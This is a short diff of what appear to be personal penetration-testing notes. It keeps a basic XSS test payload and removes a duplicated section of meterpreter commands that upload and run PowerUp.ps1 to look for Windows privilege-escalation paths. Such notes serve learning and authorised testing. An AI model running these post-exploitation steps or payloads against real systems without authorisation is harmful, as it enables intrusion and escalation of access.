@@ -368,18 +368,6 @@ test for XXS
 <script>alert('xss')</script>
 ```
 
-## windows priv esc
-
-upload and run PowerUp.ps1 in a meterpreter session
-
-```
-upload /home/kali/Documents/PowerUp.ps1
-load powershell
-powershell_shell
-. .\PowerUp.ps1
-Invoke-AllChecks
-```
-
 ## Windows Priv esc
 
 in meterpreter session upload powerup and execute scan
